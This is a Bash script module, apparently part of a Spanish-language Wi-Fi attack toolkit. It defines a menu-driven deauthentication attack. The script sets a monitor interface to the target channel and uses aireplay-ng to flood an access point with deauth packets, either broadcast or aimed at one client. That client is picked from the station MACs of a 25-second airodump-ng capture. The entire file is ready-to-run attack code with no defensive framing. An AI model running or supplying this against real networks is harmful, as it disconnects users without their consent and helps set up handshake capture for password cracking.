#!/bin/bash

function deauth_attack() {
    banner
    ensure_mon_interface
    
    echo -e "${YELLOW}[*] Selecciona el AP Objetivo para el ataque...${NC}"
    start_scan_and_selection "airodump"
    if [ $? -ne 0 ]; then
        echo -e "${RED}[!] No se seleccionó ningún objetivo.${NC}"
        read -p "Presiona Enter para volver..."
        return
    fi
    
    local target_bssid="$TARGET_BSSID"
    local target_ch="$TARGET_CHANNEL"
    local target_essid="$TARGET_ESSID"
    
    while true; do
        clear
        banner
        local disp_essid=$(echo "$target_essid" | cut -c 1-30)
        
        echo ""
        echo -e "${YELLOW}  ATAQUE DEAUTH${NC}"
        echo -e "  Target: ${GREEN}$disp_essid${NC} (${CYAN}$target_bssid${NC})"
        echo -e "  Channel: ${CYAN}$target_ch${NC}"
        echo ""
        echo -e "  ${CYAN}1${NC}  Ataque masivo (Broadcast - 15 pkts)"
        echo -e "  ${CYAN}2${NC}  Ataque particular (Buscar clientes)"
        echo -e "  ${CYAN}3${NC}  Volver"
        echo ""
        read -p "  → Opción: " d_opt
        
        case $d_opt in
            1)
                echo -e "${YELLOW}[*] Preparando ataque masivo a $target_bssid...${NC}"
                iwconfig "$mon_interface" channel "$target_ch"
                echo -e "${YELLOW}[*] Enviando 15 paquetes de desautenticación (Broadcast)...${NC}"
                aireplay-ng -0 15 -a "$target_bssid" "$mon_interface"
                echo -e "${GREEN}[+] Ataque finalizado.${NC}"
                read -p "Presiona Enter para continuar..."
                ;;
            2)
                echo -e "${YELLOW}[*] Monitoreando clientes en $target_bssid (Canal $target_ch)...${NC}"
                echo -e "${YELLOW}[*] Espere 25 segundos para detectar tráfico...${NC}"
                
                local client_scan_prefix="/tmp/wifi_clients_scan"
                rm -f "${client_scan_prefix}"*
                
                # Iniciar airodump filtrado por BSSID y Canal
                airodump-ng -c "$target_ch" --bssid "$target_bssid" -w "$client_scan_prefix" --output-format csv "$mon_interface" > /dev/null 2>&1 &
                local scan_pid=$!
                
                # Barra de progreso
                for ((i=1; i<=25; i++)); do
                    echo -n "▓"
                    sleep 1
                done
                echo ""
                
                kill $scan_pid 2>/dev/null
                wait $scan_pid 2>/dev/null
                
                local csv_file="${client_scan_prefix}-01.csv"
                
                if [ ! -f "$csv_file" ]; then
                    echo -e "${RED}[!] Error: No se generó archivo de captura.${NC}"
                else
                    echo -e "\n${YELLOW}--- Clientes Detectados ---${NC}"
                    local count=0
                    local -a client_macs
                    
                    while IFS=',' read -r col1 col2 col3 col4 col5 col6 rest; do
                        col1=$(echo "$col1" | tr -d '[:space:]')
                        
                        if [[ "$col1" == "StationMAC" ]]; then
                            in_stations=1
                            continue
                        fi
                        
                        if [[ "$in_stations" == "1" && "$col1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                             count=$((count+1))
                             client_macs[$count]="$col1"
                             power=$(echo "$col4" | tr -d '[:space:]')
                             packets=$(echo "$col6" | tr -d '[:space:]')
                             
                             echo -e "$count) MAC: ${GREEN}$col1${NC} | Pwr: $power | Pkts: $packets"
                        fi
                    done < "$csv_file"
                    
                    if [ "$count" -eq 0 ]; then
                        echo -e "${RED}[!] No se encontraron clientes conectados durante el escaneo.${NC}"
                    else
                        echo ""
                        read -p "Selecciona el número del cliente a atacar: " c_sel
                        if [[ "$c_sel" -gt 0 && "$c_sel" -le "$count" ]]; then
                            target_client="${client_macs[$c_sel]}"
                            echo -e "${YELLOW}[*] Atacando a cliente: $target_client${NC}"
                            iwconfig "$mon_interface" channel "$target_ch"
                            aireplay-ng -0 15 -a "$target_bssid" -c "$target_client" "$mon_interface"
                            echo -e "${GREEN}[+] Ataque particular finalizado.${NC}"
                        else
                            echo -e "${RED}[!] Selección inválida.${NC}"
                        fi
                    fi
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            3) return ;;
            *) echo "Opción inválida." ;;
        esac
    done
}
